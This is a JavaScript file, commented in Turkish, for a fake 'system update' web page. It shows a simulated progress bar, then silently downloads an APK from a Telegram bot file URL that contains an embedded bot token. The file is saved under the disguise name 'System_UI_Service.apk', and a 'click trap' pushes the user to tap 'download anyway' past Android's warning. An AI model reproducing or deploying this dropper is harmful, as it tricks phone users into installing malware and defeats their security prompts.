document.getElementById('start-btn').addEventListener('click', function() {
    const btn = this;
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    const title = document.getElementById('title');
    const trap = document.getElementById('click-trap');
    
    // UI Değişikliği
    btn.style.display = 'none';
    title.innerText = "Sistem Güncelleniyor";
    
    // İndirilecek APK (Telegram linklerinden biri)
    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";

    let width = 0;
    const interval = setInterval(() => {
        // Rastgele artış hızı (Daha gerçekçi durur)
        width += Math.random() * 3;
        
        if (width >= 100) {
            clearInterval(interval);
            bar.style.width = "100%";
            status.innerText = "Paket açılıyor...";

            // 1. ADIM: İndirmeyi Gizli Link ile Başlat (CORS Bypass)
            const a = document.createElement('a');
            a.href = apkUrl;
            a.download = "System_UI_Service.apk"; // Videodaki sahte isim
            a.target = "_self";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // 2. ADIM: Tıklama Tuzağını Aktif Et
            trap.style.display = "block";
            
            setTimeout(() => {
                status.innerHTML = "<b>ÖNEMLİ:</b> Güncellemenin tamamlanması için alttaki pencerede <b>'Yine de indir'</b> butonuna basın.";
            }, 1000);

        } else {
            bar.style.width = width + "%";
            status.innerText = "İndiriliyor: %" + Math.round(width);
        }
    }, 150);
});
